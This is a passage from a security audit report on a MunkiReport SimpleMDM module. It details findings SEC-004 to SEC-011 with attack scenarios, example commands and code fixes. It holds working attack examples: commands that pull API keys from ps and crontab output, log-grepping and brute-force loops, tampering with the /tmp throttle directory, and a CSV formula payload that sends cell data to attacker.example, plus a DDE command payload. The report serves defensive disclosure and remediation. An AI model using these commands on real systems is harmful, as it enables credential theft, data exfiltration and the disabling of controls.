A second, quieter variant: a MunkiReport global administrator triggers `Run Sync Now` from the admin UI and the key is returned in the JSON response, landing in browser history, browser devtools, any HTTP proxy log, and frequently in a support ticket when the administrator pastes the output to report a failure.

**Concrete example payload or request:**

```bash
# On the host, as any local user, during a scheduled sync:
ps auxww | grep -o -- '--api-key [^ ]*'
# --api-key <key>

# Or, permanently, if cron was installed by a pre-1.3.6 version:
crontab -l | grep -o -- "--api-key '[^']*'"

# The captured key then works directly against the vendor API:
curl -u '<key>:' 'https://a.simplemdm.com/api/v1/devices'
```

**Business Impact:** Disclosure of the MDM tenant API key to any local account on the server. Consequences run to full fleet control — remote wipe of every managed device is the worst case, with data disclosure and service disruption as intermediate outcomes. The exposure is silent: reading `ps` output leaves no trace in application logs, so an organisation would have no indication the key had been taken.

**Real-world precedent:** Secrets on the command line are a long-standing and well-documented anti-pattern; CWE-214 (Invocation of Process Using Visible Sensitive Information) covers it directly. It is the reason `curl` provides `--netrc` and `-K`, `mysql` warns when `-p<password>` is used inline, and CI systems inject credentials through the environment rather than as arguments.

#### Remediation Applied

The key was removed from all three command strings and is now supplied through the child process environment. Both `simplemdm_sync.py` and `install_cron.sh` already read `SIMPLEMDM_API_KEY` from the environment, so no interface change was needed on the receiving side.

```php
// simplemdm_controller.php — after fix
private function run_local_script_command($command, $cwd, $env = null)
{
    $process_env = null;
    if (is_array($env)) {
        $process_env = array_merge(getenv(), $env);
    }
    $process = proc_open($command, $descriptor_spec, $pipes, $cwd, $process_env);
    // ...
}

$result = $this->run_local_script_command(
    $commands[$action],
    $cwd,
    ['SIMPLEMDM_API_KEY' => $this->get_stored_api_key()]
);

jsonView([
    // ...
    'stdout' => $this->redact_secrets($result['stdout']),
    'stderr' => $this->redact_secrets($result['stderr']),
], $result['ok'] ? 200 : 500);
```

```bash
# scripts/install_cron.sh — after fix
CRON_CMD="set -a; . '$ENV_FILE'; set +a; $PYTHON_BIN $SYNC_SCRIPT --munkireport-url '$MUNKIREPORT_URL' ..."

(
    umask 077
    {
        echo "# Written by install_cron.sh. Keep mode 0600."
        echo "SIMPLEMDM_API_KEY=$(shell_quote "$SIMPLEMDM_API_KEY")"
    } > "$ENV_FILE"
)
chmod 600 "$ENV_FILE"
```

`redact_secrets()` was added as defence in depth, masking any configured secret of eight or more characters out of returned script output. `--env-file` allows relocating the secrets file and refuses any path inside the web-served module directory.

**Fix rationale:** The environment is not readable from `ps` by other users on either Linux or macOS, which addresses the root cause rather than obscuring it. Writing the cron secret to a `0600` file under `umask 077` avoids a window in which the file exists with permissive permissions. Redacting returned output is secondary defence for the case where a verbose script prints a secret itself.

#### Verification

- `SecretHandlingGuardTest::testRunScriptNeverPutsTheApiKeyOnTheCommandLine` asserts the `--api-key %s` pattern is absent and the environment hand-off is present; `testCronEntryCarriesNoSecret` and `testEnvFileCannotLandInsideTheModuleDirectory` cover the shell script.
- `bash -n scripts/install_cron.sh` clean; `--print-only` dry run confirms the emitted cron line contains no key.
- Round-trip test with a key containing `'`, `"` and `$` confirmed `shell_quote` produces a file that re-sources to the exact original value, at mode `-rw-------`.
- Full suite: `OK (113 tests, 215 assertions)`.

---

### SEC-005 — Action secret accepted in the URL query string

| Field | Value |
|---|---|
| **Severity** | Medium |
| **OWASP Category** | A02:2025 – Security Misconfiguration |
| **Status** | Fixed |
| **Location** | `simplemdm_controller.php` `extract_action_secret_from_request()` |
| **Affected Version** | `97d7e2a` and earlier |
| **Fixed In** | `b7f1aa6` |

#### Description

`extract_action_secret_from_request()` resolved the action secret from three sources in order: request headers, `$_POST`, and finally `$_GET`. The action secret authorises mutating operations through the SimpleMDM device passthrough proxy — the endpoints that lock, wipe, restart and otherwise command enrolled devices. Accepting it from the query string places a high-value credential into every log layer that records URLs.

#### Evidence

```php
// simplemdm_controller.php — before fix
if (isset($_POST['action_secret']) && trim((string)$_POST['action_secret']) !== '') {
    return trim((string)$_POST['action_secret']);
}
if (isset($_GET['action_secret']) && trim((string)$_GET['action_secret']) !== '') {
    return trim((string)$_GET['action_secret']);
}
```

#### Attack Scenario

**Threat Actor:** Anyone with read access to web server logs, reverse proxy or load balancer logs, a corporate TLS-inspecting proxy, or an APM/observability platform ingesting request URLs. This includes support staff, log aggregation service accounts, and any third party the organisation ships logs to.

**Prerequisites:** That an administrator or integration has used the query-string form at least once, and read access to any log tier that records full request URLs.

**Step-by-step exploitation:**

1. An administrator or script performs a device action using the documented query-string form, because it is the most convenient to test with.
2. The full URL, including `?action_secret=…`, is written to the web server access log. On a typical deployment it is simultaneously recorded by the reverse proxy, shipped to a central log platform, and retained for months under a logging policy that assumed URLs contain no secrets.
3. An attacker with log access — which is routinely granted far more widely than production credentials — greps for `action_secret=`.
4. Holding the secret, they call the mutating passthrough endpoints. Note that this alone is not sufficient: those endpoints also require a global-admin session, so the secret is a second factor rather than a standalone credential.
5. Combined with any session-level compromise — including SEC-001 or SEC-002 above, which yield an administrator session — the recovered secret removes the remaining control on destructive device commands such as erase.

An additional leakage path: if any page reached with the secret in the URL links to a third-party origin, the secret is transmitted in the `Referer` header to that third party.

**Concrete example payload or request:**

```bash
# The form that was accepted, and that lands in logs:
curl -X POST -b "$ADMIN_SESSION" \
  'https://munkireport.example/module/simplemdm/api_devices/12345/lock?action_secret=<secret>'

# Later recovery from logs:
grep -ho 'action_secret=[^& ]*' /var/log/nginx/access.log* | sort -u
```

**Business Impact:** Weakens the defence-in-depth control specifically intended to gate destructive MDM operations. The secret's value is that it is a distinct factor from the session; storing it in logs collapses it into the same trust tier as ordinary operational access. Regulatory frameworks that treat logs as a lower-sensitivity data class are undermined when logs contain live credentials.

**Real-world precedent:** Credentials in query strings are covered by CWE-598 (Use of GET Request Method With Sensitive Query Strings) and have produced repeated real incidents — most visibly where access tokens in URLs were captured by third-party analytics via the `Referer` header.

#### Remediation Applied

```php
// simplemdm_controller.php — after fix
if (isset($_POST['action_secret']) && trim((string)$_POST['action_secret']) !== '') {
    return trim((string)$_POST['action_secret']);
}

// Deliberately NOT read from $_GET: a secret in the query string is
// written to web server access logs, proxy logs and Referer headers.
// Callers must use a header or the POST/JSON body.
```

**Fix rationale:** Removing the source entirely is preferable to sanitising logs downstream, which requires every log tier to cooperate and fails silently when a new tier is added. Header and body transport were already supported, so no legitimate caller loses functionality.

#### Verification

- `SecretHandlingGuardTest::testActionSecretIsNotReadFromTheQueryString` asserts the `$_GET['action_secret']` pattern cannot reappear.
- Full suite: `OK (113 tests, 215 assertions)`.

---

### SEC-006 — Module download archive ships every file except `.git`

| Field | Value |
|---|---|
| **Severity** | Medium |
| **OWASP Category** | A01:2025 – Broken Access Control (excessive data exposure) |
| **Status** | Fixed |
| **Location** | `simplemdm_controller.php` `create_module_archive()`, reached via `download_module()` |
| **Affected Version** | `97d7e2a` and earlier |
| **Fixed In** | `b7f1aa6` |

#### Description

`create_module_archive()` walked the entire module directory and excluded exactly one path — `.git`. Everything else was packaged into the zip served by `download_module()`. The archive is intended as a distribution artefact containing the module, but its contents were defined by whatever happened to be present on disk.

At audit time the module directory on the reviewed instance contained a `.gstack/` directory at mode `700` holding captured browser session and network logs, a `.claude/` directory, `.DS_Store`, a `.scratch_video/` directory, `vendor/`, and a nested `claude-Workflow/` tree — none of which belong in a distributed module, and at least one of which holds operational capture data.

#### Evidence

```php
// simplemdm_controller.php — before fix
foreach ($iterator as $item) {
    $full_path = $item->getPathname();
    $relative_path = substr($full_path, strlen($this->module_path) + 1);
    if (! $relative_path) { continue; }
    if ($relative_path === '.git' || strpos($relative_path, '.git/') === 0) {
        continue;
    }
    // everything else is added
}
```

```
# Actual module directory contents at audit time
drwx------   5 helpdesk  staff   160 .gstack          <- 700, session/network capture
drwxr-xr-x   4 helpdesk  staff   128 .claude
-rw-r--r--@  1 helpdesk  staff 14340 .DS_Store
drwxr-xr-x  24 helpdesk  staff   768 .scratch_video
drwxr-xr-x@ 11 helpdesk  staff   352 claude-Workflow
```

#### Attack Scenario

**Threat Actor:** A MunkiReport global administrator. This is the constraining factor and the reason the finding is Medium rather than High — the endpoint is correctly gated behind `require_global_authorized()`.

**Prerequisites:** A global-admin session, and files of interest present in the module directory. Note that a global-admin session is itself obtainable via SEC-001 or SEC-002, so this finding composes with them.

**Step-by-step exploitation:**

1. The attacker obtains a global-admin session — legitimately as an over-privileged operator, or by chaining from the stored XSS findings above.
2. They request `GET /module/simplemdm/download_module`.
3. The server zips the module directory, mode-`700` directories included, since the PHP process can read them and only `.git` is filtered.
4. The attacker unpacks the archive locally and inspects the non-module content: `.gstack/browse-audit.jsonl` and `browse-network.log` contain captured browsing and network activity; other tooling directories may contain configuration, tokens or notes depending on what the operator has been running.
5. Any credential, session artefact or internal detail present in those files is now exfiltrated in a single request that looks, in the access log, like a routine module download.

**Concrete example payload or request:**

```bash
curl -b "$ADMIN_SESSION" -o module.zip \
  'https://munkireport.example/module/simplemdm/download_module'
unzip -l module.zip | grep -E '\.gstack|\.claude|\.DS_Store'
```

**Business Impact:** Unbounded and growing. The exposure is not defined by the module's own contents but by whatever an operator leaves in the directory, which means it worsens over time without any code change. On a development or staging host where tooling state accumulates, the archive becomes an inadvertent exfiltration channel.

**Real-world precedent:** Directly analogous to the widespread exposure of `.git`, `.env` and editor state via over-broad packaging or web-root serving. The recurring lesson — that an allowlist of intended contents is required, because a denylist of one known-bad path will not keep pace — is exactly what this finding demonstrates.

#### Remediation Applied

```php
// simplemdm_controller.php — after fix
private function is_excluded_from_module_archive($relative_path)
{
    $relative_path = str_replace('\\', '/', (string) $relative_path);
    $segments = explode('/', $relative_path);

    // Any dot-file or dot-directory, at any depth.
    foreach ($segments as $segment) {
        if ($segment !== '' && $segment[0] === '.') {
            return true;
        }
    }

    $excluded_roots = ['vendor', 'tests', 'node_modules', '__pycache__', 'claude-Workflow'];
    if (in_array($segments[0], $excluded_roots, true)) {
        return true;
    }

    $basename = $segments[count($segments) - 1];
    foreach (['.pyc', '.pyo', '.log', '.swp', '~'] as $suffix) {
        if ($suffix !== '' && substr($basename, -strlen($suffix)) === $suffix) {
            return true;
        }
    }

    return false;
}
```

**Fix rationale:** Excluding all dot-entries at any depth generalises past the specific directories present today, so tooling introduced later is excluded by default rather than requiring the list to be updated. The named roots cover build and dependency trees that are legitimately non-hidden but still do not belong in a distribution artefact.

#### Verification

- `SecretHandlingGuardTest::testModuleArchiveExcludesDotEntriesAndDevDirectories` asserts the helper exists and that each named root remains listed.
- Full suite: `OK (113 tests, 215 assertions)`.

---

### SEC-007 — CSV formula injection in the MCP findings export

| Field | Value |
|---|---|
| **Severity** | Medium |
| **OWASP Category** | A03:2025 – Injection |
| **Status** | Fixed |
| **Location** | `simplemdm_controller.php` `export_mcp_findings()` |
| **Affected Version** | `97d7e2a` and earlier |
| **Fixed In** | `b7f1aa6` |

#### Description

`export_mcp_findings()` wrote finding rows to CSV with `fputcsv` and no neutralisation of spreadsheet formula triggers. The `message` and `data` columns carry text supplied by whichever scanner pushed the finding; `message` is only length-capped at 1,000 characters on ingest and is never checked for a leading `=`, `+`, `-`, `@`, tab or carriage return.

`fputcsv` correctly quotes and escapes for CSV *parsing*, which is a different problem from formula *evaluation* — a properly quoted field beginning with `=` is still evaluated as a formula by every major spreadsheet application.

#### Evidence

```php
// simplemdm_controller.php — before fix
$out = fopen('php://output', 'w');
fputcsv($out, $columns);
foreach ($rows as $row) {
    $line = [];
    foreach ($columns as $col) {
        $line[] = isset($row[$col]) ? $row[$col] : '';   // no neutralisation
    }
    fputcsv($out, $line);
}
```

```php
// The only constraint applied to message on ingest:
'message' => substr($message, 0, 1000),
```

#### Attack Scenario

**Threat Actor:** Anyone able to push an MCP finding — a holder of the sync token, a compromised or malicious scanner integration, or an attacker who has compromised the MCP publisher. The ingest endpoint accepts an arbitrary `source` slug, so a new publisher does not stand out.

**Prerequisites:** The ability to push one finding, and an operator who subsequently exports findings to CSV and opens the file — a routine reporting workflow.

**Step-by-step exploitation:**

1. The attacker pushes a finding whose `message` begins with `=`, crafted to look plausible in the dashboard. Spreadsheet applications render the formula's *result*, not its text, so a well-chosen payload displays as innocuous.
2. The finding is stored verbatim and appears normally in the web UI, where it is inert — the views escape it as text.
3. An operator exports findings for a report: `GET /module/simplemdm/export_mcp_findings?format=csv`.
4. The operator opens the file in Excel, LibreOffice or Google Sheets. The cell is parsed as a formula and evaluated on open.
5. With `=HYPERLINK(...)` the operator sees a link that, when clicked, transmits adjacent cell contents — serial numbers, finding detail, the whole row — to an attacker-controlled host. With `=WEBSERVICE(...)` in older Excel configurations, or via DDE payloads such as `=cmd|'/c calc'!A1` where legacy DDE remains enabled, the impact escalates to unattended data retrieval or command execution on the operator's workstation. Modern versions prompt before executing external content, so the realistic outcome is data exfiltration on a single click rather than silent code execution.

**Concrete example payload or request:**

```bash
curl -X POST 'https://munkireport.example/module/simplemdm/ingest_mcp_findings' \
  -H 'X-SIMPLEMDM-API-KEY: <sync token>' \
  -H 'Content-Type: application/json' \
  -d '{"source":"scanner","replace":false,"findings":[{
        "serial_number":"C02XX0000001",
        "finding_type":"csv_probe","category":"test","severity":"info",
        "message":"=HYPERLINK(\"https://attacker.example/?d=\"&A1,\"ok\")"}]}'
```

**Business Impact:** Moves the attack from the server to the operator's workstation, which typically sits inside the corporate network and is subject to different controls. Exfiltrated data is device security posture; in the DDE case the outcome is code execution on an administrator's endpoint. The export is a reporting artefact, so it is frequently forwarded to management or external auditors, widening the blast radius.

**Real-world precedent:** CSV injection is a well-documented class, described by OWASP as "CSV Injection" and assigned CWE-1236. It has been reported against numerous SaaS products where user-controlled text reaches an export.

#### Remediation Applied

The neutraliser was placed on the model alongside the other static export helpers, so it is directly unit-testable.

```php
// simplemdm_mcp_finding_model.php — after fix
public static function neutralizeCsvField($value)
{
    $value = (string) $value;
    if ($value === '') { return $value; }

    $trimmed = ltrim($value, " \t\r\n");
    if ($trimmed === '') { return $value; }

    if (strpos("=+-@\t\r", $trimmed[0]) !== false) {
        return "'" . $value;
    }

    return $value;
}
```

```php
// simplemdm_controller.php — after fix
$line[] = Simplemdm_mcp_finding_model::neutralizeCsvField(
    isset($row[$col]) ? $row[$col] : ''
);
```

**Fix rationale:** Prefixing with a single quote is the standard neutralisation: it forces text interpretation in every major spreadsheet application while remaining readable. Testing the first *non-whitespace* character matters because leading whitespace does not prevent formula parsing, so a naive check on `$value[0]` would be bypassable with a single leading space.

#### Verification

- `CsvInjectionTest` covers seven formula-trigger cases including the leading-whitespace bypass, eight harmless values that must pass through unchanged, and non-string coercion; plus a guard that the export routes every cell through the neutraliser.
- End-to-end live test: a finding with message `=HYPERLINK("https://attacker.example/?d="&A1,"ok")` was ingested and the CSV export returned `"'=HYPERLINK(""https://attacker.example/?d=""&A1,""ok"")"` — quoted as text. The probe row was then deleted, restoring the finding count to 211.
- Full suite: `OK (113 tests, 215 assertions)`.

---

### SEC-008 — Throttle state directory in shared temp trusted without validation

| Field | Value |
|---|---|
| **Severity** | Medium |
| **OWASP Category** | A02:2025 – Security Misconfiguration |
| **Status** | Fixed |
| **Location** | `simplemdm_controller.php` `throttle_dir()` |
| **Affected Version** | `b7f1aa6` — introduced by the SEC-011 remediation |
| **Fixed In** | `9c1dc20` |

#### Description

Found by re-reviewing the remediation rather than the original code. The rate-limiting control added for SEC-011 stored its counters in `sys_get_temp_dir() . '/simplemdm-auth-throttle'`. The directory was created with mode `0700`, but the `is_dir($dir)` short-circuit meant a *pre-existing* directory was accepted regardless of its ownership, permissions, or whether it was a symlink.

`sys_get_temp_dir()` resolves to `/tmp` on most deployments, which is world-writable. The control introduced to bound credential guessing was therefore itself controllable by any local account.

#### Evidence

```php
// simplemdm_controller.php — as introduced in b7f1aa6
private function throttle_dir()
{
    $base = sys_get_temp_dir();
    if (! $base || ! is_dir($base) || ! is_writable($base)) {
        return '';
    }

    $dir = rtrim($base, '/') . '/simplemdm-auth-throttle';
    if (! is_dir($dir) && ! @mkdir($dir, 0700, true) && ! is_dir($dir)) {
        return '';
    }

    return is_writable($dir) ? $dir : '';   // ownership and mode never checked
}
```

#### Attack Scenario

**Threat Actor:** Any local account on the MunkiReport host. On shared hosting this includes other tenants; on a dedicated host, any service account or a foothold from an unrelated issue.

**Prerequisites:** Local shell access. The directory name was fixed and predictable, so no reconnaissance was required.

**Step-by-step exploitation — variant A, disabling the throttle:**

1. Before the web process first creates it, the attacker runs `mkdir -m 777 /tmp/simplemdm-auth-throttle`. Winning this race is trivial: the directory does not exist until the first failed authentication after a reboot or temp cleanup.
2. The web process finds the directory already present, skips creation, and — because `is_writable()` returns true — uses it.
3. The attacker runs a loop deleting its contents: `while :; do rm -f /tmp/simplemdm-auth-throttle/*; sleep 1; done`.
4. Counters never accumulate, so `is_auth_throttled()` never returns true and unlimited shared-secret guessing is possible against `ingest`, `webhook` and the other token endpoints.

**Step-by-step exploitation — variant B, denial of service:**

1. Same setup.
2. The attacker writes counter files at the limit for the IP ranges used by the legitimate sync host: `echo '{"count":9999,"reset":9999999999}' > /tmp/simplemdm-auth-throttle/<sha256 of bucket|ip>`.
3. Because the constructor gate consults the throttle before the request reaches its endpoint, the sync integration receives `429` on every attempt.
4. Device inventory silently stops updating. Since the module's own security findings depend on that sync, the organisation loses device security visibility with no obvious cause — the failure looks like a rate limit, which is expected behaviour.

A symlink variant achieves the same outcomes without needing to own the directory contents: `ln -s /some/attacker/dir /tmp/simplemdm-auth-throttle`.

**Concrete example payload or request:**

```bash
# Variant A — as any local user, before the web process creates the directory:
mkdir -m 777 /tmp/simplemdm-auth-throttle
while :; do rm -f /tmp/simplemdm-auth-throttle/*; sleep 1; done &
# Guessing is now unbounded.

# Variant B — pin the sync host's bucket at the limit:
KEY=$(printf 'shared_secret|10.0.0.5' | sha256sum | cut -d' ' -f1)
echo '{"count":9999,"reset":9999999999}' > "/tmp/simplemdm-auth-throttle/$KEY"
```

**Business Impact:** Variant A silently removes a security control the organisation believes is active — arguably worse than never having added it, because it creates false assurance. Variant B is a denial of service against device inventory and security-finding collection, achievable by any local account and difficult to diagnose because the symptom is a legitimate-looking rate limit.

**Real-world precedent:** Insecure temporary file and directory handling is CWE-377 and CWE-379, and the `/tmp` symlink/pre-creation race is one of the oldest privilege and integrity issues in Unix software, with a long history of CVEs across widely-deployed packages.

#### Remediation Applied

```php
// simplemdm_controller.php — after fix
$base = sys_get_temp_dir();
if (! $base || ! is_dir($base) || ! is_writable($base)) {
    return '';
}

// Per-install suffix so two MunkiReport instances on one host do not
// share counters, and so the name is not trivially predictable.
$dir = rtrim($base, '/') . '/simplemdm-auth-throttle-'
    . substr(hash('sha256', $this->module_path), 0, 16);

if (! is_dir($dir)) {
    @mkdir($dir, 0700, true);
}

if (! is_dir($dir) || is_link($dir) || ! is_writable($dir)) {
    return '';
}

clearstatcache(true, $dir);
$owner = @fileowner($dir);
if ($owner === false || (function_exists('posix_geteuid') && $owner !== posix_geteuid())) {
    return '';
}

$perms = @fileperms($dir);
if ($perms === false || ($perms & 0077) !== 0) {
    return '';
}

return $dir;
```

**Fix rationale:** The directory is now used only when it is a real directory, not a symlink, owned by the running process, and not group- or world-writable — the four properties an attacker would need to subvert. Failing any check returns `''`, which disables throttling rather than trusting the directory; this matches the fail-open behaviour already documented for a missing temp directory, on the reasoning that an unavailable counter store must not take a working sync integration offline. The per-install name suffix additionally prevents two MunkiReport instances on one host from sharing counters and removes the fully predictable path.

#### Verification

- `SecretHandlingGuardTest::testThrottleDirectoryIsNotBlindlyTrusted` asserts the symlink, ownership, permission-mask and per-install-naming checks are all present.
- Live: the directory is created as `drwx------ 2 www-data www-data /tmp/simplemdm-auth-throttle-5618b4e8f6e70eb3`.
- Live behaviour unchanged after hardening: 22 invalid keys produce 19 × `403` then `429`, while the correct key still returns `200` from the same source address.
- Full suite: `OK (113 tests, 215 assertions)`.

---

### SEC-009 — Upgrade to 1.3.6 leaves pre-existing crontab key exposure in place

| Field | Value |
|---|---|
| **Severity** | Medium |
| **OWASP Category** | A02:2025 – Security Misconfiguration |
| **Status** | Fixed (documentation and operator procedure) |
| **Location** | `docs/UPGRADE.md`; behaviour originating in `scripts/install_cron.sh` prior to 1.3.6 |
| **Affected Version** | All versions prior to 1.3.6, persisting after upgrade |
| **Fixed In** | `708a542` |

#### Description

Found by a second review pass over the remediation. The SEC-004 fix stopped the API key being written into *new* crontab entries, but did nothing about entries already installed, and the release documentation did not mention them.

Upgrading the module replaces code; it does not rewrite the user's crontab. Any deployment that ran `install_cron.sh --install` on a pre-1.3.6 version therefore retains a crontab line containing `--api-key <key>`, and the exposure described in SEC-004 continues unchanged after upgrading. An administrator reading the changelog would reasonably conclude the issue was resolved on their system when it was not.

Compounding this, rewriting the entry is necessary but not sufficient: the key has already been readable by every local account for the entire period the old entry was installed, so it must also be rotated.

#### Evidence

```bash
# A crontab entry installed by any pre-1.3.6 version, still present after upgrade:
* * * * * /usr/bin/python3 /var/munkireport/local/modules/simplemdm/scripts/simplemdm_sync.py \
  --api-key '<key>' --munkireport-url 'https://mr' --respect-schedule \
  --max-parent-resources 25 >> /var/log/simplemdm_sync.log 2>&1
```

Before this fix, `docs/UPGRADE.md` contained no reference to the crontab, the API key, or rotation; a source-wide search for remediation guidance returned only an unrelated note about client-reporter configuration defaults.

#### Attack Scenario

**Threat Actor:** As SEC-004 — any local account on the host.

**Prerequisites:** A deployment that installed cron before 1.3.6 and has since upgraded, whose administrator believes the issue is resolved.

**Step-by-step exploitation:**

1. The organisation upgrades to 1.3.6 and records the security fix as applied.
2. The crontab still contains the key. Nothing in the upgrade process touches it, and nothing in the documentation prompts the administrator to check.
3. An attacker with any local foothold reads `crontab -l` or the spool file and recovers the key exactly as in SEC-004.
4. Because the issue is believed closed, the key is not rotated and the exposure window is treated as ended when it is in fact ongoing.

**Concrete example payload or request:**

```bash
# On an "already patched" host:
crontab -l | grep -o -- "--api-key '[^']*'"
# --api-key '<key>'
```

**Business Impact:** The same MDM tenant compromise as SEC-004, with the aggravating factor of false assurance — the organisation has recorded the finding as remediated and stopped looking. Incomplete remediation that is believed complete is materially worse than an open finding that is tracked, because it removes the issue from the risk register.

**Real-world precedent:** Incomplete remediation is a recognised pattern, reflected in CWE-1288 and in the frequency with which follow-up CVEs are issued for fixes that addressed the code path but not the deployed artefacts or already-exposed credentials.

#### Remediation Applied

`docs/UPGRADE.md` now opens with a mandatory section, placed before the general upgrade principles so it cannot be missed:

```markdown
## 0) Required Action When Upgrading To 1.3.6 (Security)

**This applies only if you installed the cron entry before 1.3.6.** Upgrading
the code does not remediate it for you.

1. Check whether your existing entry carries the key:
   crontab -l | grep -- '--api-key'

2. If it matches, rewrite the entry with the new script:
   export SIMPLEMDM_API_KEY='YOUR_SIMPLEMDM_API_KEY'
   local/modules/simplemdm/scripts/install_cron.sh \
     --munkireport-url 'https://your-munkireport' --install

   Confirm the key is gone:
   crontab -l | grep -- '--api-key'   # expect no output
   ls -l ~/.simplemdm_sync.env        # expect -rw-------

3. **Rotate the SimpleMDM API key.** It has been readable by any local account
   for as long as the old entry was installed, so replacing the entry alone
   does not undo the exposure. Follow SECURITY.md §4, then re-run step 2.
```

**Fix rationale:** The remediation is operational, so the fix has to be operational too — there is no safe way for the module to rewrite a user's crontab automatically. Detection is given first so administrators can determine whether they are affected in one command. Rotation is stated as mandatory rather than advisory because replacing the entry does not undo an exposure that has already occurred.

#### Verification

- Documentation change; verified by reading the rendered section and confirming the detection command matches the exact string written by pre-1.3.6 versions of `install_cron.sh`.
- The remediation commands were exercised in the SEC-004 verification: `--print-only` confirms the rewritten entry carries no key, and the env file is created at mode `-rw-------`.

---

### SEC-010 — Raw exception detail returned to clients

| Field | Value |
|---|---|
| **Severity** | Low |
| **OWASP Category** | A10:2025 – Mishandling of Exceptional Conditions |
| **Status** | Fixed |
| **Location** | `simplemdm_controller.php` `ingest()`, `download_module()`, `build_supplemental_source_payload()` |
| **Affected Version** | `97d7e2a` and earlier |
| **Fixed In** | `b7f1aa6` |

#### Description

Three error paths returned `$e->getMessage()` directly in the response body. For an Eloquent or PDO failure that message includes the full SQL statement, bound parameter values, and table and column names.

#### Evidence

```php
// ingest() — before fix
} catch (\Throwable $e) {
    jsonView(['status' => 'error', 'message' => $e->getMessage()], 400);
}

// build_supplemental_source_payload() — before fix, reachable by any authenticated user
} catch (\Throwable $e) {
    $payload['present'] = null;
    $payload['reason']  = 'query_failed';
    $payload['detail']  = ['error' => $e->getMessage()];
```

#### Attack Scenario

**Threat Actor:** For `ingest()` and `download_module()`, a holder of the sync token or a global administrator — a narrow audience. For the supplemental source path, **any authenticated user**, which is the broadest exposure of the three.

**Prerequisites:** The ability to trigger a database error. The supplemental source path queries dynamically discovered tables belonging to other MunkiReport modules, so a schema mismatch after a partial upgrade or a missing module table produces one without any deliberate effort.

**Step-by-step exploitation:**

1. The attacker, holding any session, opens a device detail page for a device whose supplemental sources include a module whose table is missing or has changed shape.
2. The query fails and the JSON response carries the driver's message, disclosing the SQL statement, the real table and column names, and the database engine and version.
3. That schema knowledge shortens reconnaissance for any subsequent injection attempt elsewhere in the application, and reveals which MunkiReport modules are installed — useful for selecting a target with known vulnerabilities.

**Concrete example payload or request:**

```
GET /module/simplemdm/get_supplemental_data/<serial>

{"present":null,"reason":"query_failed",
 "detail":{"error":"SQLSTATE[42S02]: Base table or view not found: 1146 Table
  'munkireport.munkiinfo' doesn't exist (SQL: select `serial_number`, `version`
  from `munkiinfo` where `serial_number` = C02XX0000001)"}}
```

**Business Impact:** Information disclosure that assists reconnaissance rather than causing direct harm. Rated Low because it discloses structure, not data, and the highest-exposure path requires authentication.

**Real-world precedent:** CWE-209 (Generation of Error Message Containing Sensitive Information). Verbose database errors are a standard early step in application penetration testing.

#### Remediation Applied

```php
private function log_internal_error($context, $e)
{
    error_log(sprintf(
        'simplemdm[%s]: %s: %s in %s:%d',
        (string) $context, get_class($e), $e->getMessage(), $e->getFile(), $e->getLine()
    ));
}

// ingest()
} catch (\Throwable $e) {
    $this->log_internal_error('ingest', $e);
    jsonView(['status' => 'error', 'message' => 'Ingest failed'], 400);
}

// build_supplemental_source_payload()
$this->log_internal_error('supplemental_source:' . $source_id, $e);
$payload['detail'] = ['error' => 'Supplemental source query failed. See the server log for details.'];
```

**Fix rationale:** The diagnostic value of the message is preserved for the operator, who can correlate by context label and timestamp, while the client receives only the fact of failure. The two `\RuntimeException` handlers in `save_config()` were deliberately left unchanged — those carry authored validation text intended for the administrator, not internal detail.

#### Verification

- Manual review confirmed the three call sites now log and return generic text, and that the two intentional validation handlers are untouched.
- Full suite: `OK (113 tests, 215 assertions)`.

---

### SEC-011 — No throttling on shared-secret authentication attempts

| Field | Value |
|---|---|
| **Severity** | Low |
| **OWASP Category** | A07:2025 – Authentication Failures |
| **Status** | Fixed |
| **Location** | `simplemdm_controller.php` — constructor and all shared-secret endpoints |
| **Affected Version** | `97d7e2a` and earlier |
| **Fixed In** | `b7f1aa6`, hardened in `9c1dc20` |

#### Description

No endpoint applied any limit to failed authentication attempts. The eight matches for `rate_limit` in the controller are SimpleMDM API rate-limit telemetry fields recorded from sync runs, not request throttling.

All four secret comparisons already use `hash_equals`, so there was no timing oracle. The gap was purely one of volume: an attacker could attempt secrets as fast as the server would answer.

#### Evidence

```php
// ingest() — before fix: validate, reject, no counting of failures
public function ingest()
{
    $this->connectDB();
    if (! $this->is_valid_sync_token()) {
        jsonView(['status' => 'error', 'message' => 'Unauthorized'], 401);
        return;
    }
```

#### Attack Scenario

**Threat Actor:** An unauthenticated remote attacker with network access to MunkiReport.

**Prerequisites:** Reachability of the module endpoints. No credentials.

**Step-by-step exploitation:**

1. The attacker identifies the module's token endpoints, which are documented in the public repository.
2. They run a distributed guessing campaign against `POST /module/simplemdm/ingest` with candidate `X-SIMPLEMDM-API-KEY` values.
3. No counter, lockout or delay applies. Attempt rate is bounded only by the server's capacity and the network path.
4. Against a high-entropy 64-character key this is not a realistic path to compromise. It becomes realistic where a key has been shortened, reused from another system, derived from a predictable pattern, or partially disclosed — for example through SEC-004's `ps` exposure observed intermittently, or a truncated value in a log.
5. Separately, the unbounded request volume is itself a resource-consumption concern, since each attempt performs a database read to fetch the stored key.

**Concrete example payload or request:**

```bash
while read -r candidate; do
  curl -s -o /dev/null -w "%{http_code} $candidate\n" \
    -X POST -H "X-SIMPLEMDM-API-KEY: $candidate" -d '{}' \
    'https://munkireport.example/module/simplemdm/ingest'
done < candidates.txt
# Before the fix: 401 (or 403) indefinitely, at full speed.
```

**Business Impact:** Low in isolation given the key's entropy, but it removes a layer that would otherwise contain a partially-disclosed or weak secret, and leaves an unbounded, database-touching request path open to anonymous callers.

**Real-world precedent:** CWE-307 (Improper Restriction of Excessive Authentication Attempts). Credential stuffing and API key guessing against unthrottled endpoints remain among the most common automated attacks.

#### Remediation Applied

A file-backed sliding-window counter allowing 20 failures per client address per 15 minutes, keyed by a hash of bucket and `REMOTE_ADDR`.

```php
const AUTH_FAILURE_LIMIT = 20;
const AUTH_FAILURE_WINDOW_SECONDS = 900;

// Only a presented-but-wrong credential counts. A request carrying no header
// is a browser session, not a guess.
private function note_auth_result($bucket, $presented, $ok)
{
    if ($presented) {
        if ($ok) { $this->clear_auth_failures($bucket); }
        else     { $this->record_auth_failure($bucket); }
    }
    return $ok;
}

// The throttle is consulted only AFTER a credential is found invalid, so a
// caller presenting the correct secret is never locked out.
private function deny_shared_secret($bucket = 'shared_secret')
{
    if ($this->is_auth_throttled($bucket)) {
        $state = $this->read_throttle_state($this->throttle_file($bucket));
        header('Retry-After: ' . max(1, $state['reset'] - time()));
        jsonView(['status' => 'error',
                  'message' => 'Too many failed authentication attempts. Try again later.'], 429);
        return;
    }
    jsonView(['status' => 'error', 'message' => 'Unauthorized'], 401);
}
```

